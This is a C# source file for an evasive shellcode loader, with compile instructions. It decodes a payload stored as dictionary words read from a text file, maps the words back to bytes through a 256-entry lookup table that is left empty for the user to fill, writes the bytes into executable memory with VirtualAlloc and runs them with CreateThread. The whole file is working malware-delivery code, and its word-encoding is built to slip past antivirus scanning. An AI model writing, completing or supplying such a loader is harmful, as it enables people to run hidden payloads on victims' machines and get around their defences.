/* 
C# Dictionary Shellcode Program

Compile:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /out:DictionShellcode_FromFile.exe CSharp_DictionShellcode-FromFile.cs
*/
using System;
using System.Text;
using System.IO;   // File read
using System.Linq; // File read
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MC = 0x1000;
    private static UInt32 PER = 0x40;

    // Shellcode translation Dictionary - SHELLCODE DICTIONARY GOES HERE
    public static string[] translate_dict = new string[256] {  };

    static void Main(string[] args)
    {
        // Dictionary words loaded from file
        string[] dict_words = ReadFromFile("DictionaryWords.txt");

        int len = dict_words.Length;
        byte[] shellcode = new byte[len]; // Output var

        // Decode words using input Dictionary wordlist "translate_dict"
        for (uint sc_index = 0; sc_index < len; sc_index++) // Loop through words first
        {
            for (uint dict_index = 0; dict_index < 256; dict_index++) // Loop through translation dictionary words second
            {
                // If the word was found in the Dictionary
                if (translate_dict[dict_index] == dict_words[sc_index])
                {
                    // Convert words to byte and add to output variable
                    shellcode[sc_index] = (byte)(dict_index);
                    break;
                }
            }
        }

        // Allocate shellcode
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)len, MC, PER);
        Marshal.Copy(shellcode , 0, (IntPtr)funcAddr, len);

        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;

        // Execute
        hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);

        return;
    }

    // Read input file by path
    static string[] ReadFromFile(string filePath)
    {
        // Check if the file exists
        if (!File.Exists(filePath))
        {
            throw new FileNotFoundException("File not found: " + filePath);
        }

        // Read all lines from the file
        string[] lines = File.ReadAllLines(filePath);

        // Split lines into words
        string[] wordsArray = lines.SelectMany(line => line.Split(new[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries)).ToArray();

        return wordsArray;
    }
}
